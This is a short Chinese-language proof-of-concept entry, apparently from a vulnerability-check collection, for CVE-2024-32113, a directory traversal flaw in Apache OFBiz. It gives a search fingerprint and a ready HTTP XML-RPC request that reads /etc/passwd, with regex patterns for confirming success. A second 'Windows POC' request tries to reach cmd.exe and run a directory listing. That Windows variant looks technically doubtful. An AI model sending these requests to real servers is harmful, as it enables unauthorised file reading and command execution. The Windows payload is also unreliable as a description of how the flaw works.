﻿# Apache OFBiz 目录遍历漏洞 

> 更新时间：2024-05-20

> 漏洞编号：CVE-2024-32113

> 漏洞说明：

> 漏洞特征：product.name="OFBiz"

> 验证脚本：HTTP

```
POST /webtools/control/xmlrpc HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>example.createBlogPost</methodName>
  <params>
    <param>
      <value><string>../../../../../../etc/passwd</string></value>
    </param>
  </params>
</methodCall>
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：Apache OFBiz 目录遍历漏洞

```
Windows POC:
POST /webtools/control/xmlrpc HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>performCommand</methodName>
  <params>
    <param>
      <value><string>../../../../../../windows/system32/cmd.exe?/c+dir+c:\</string></value>
    </param>
  </params>
</methodCall>
```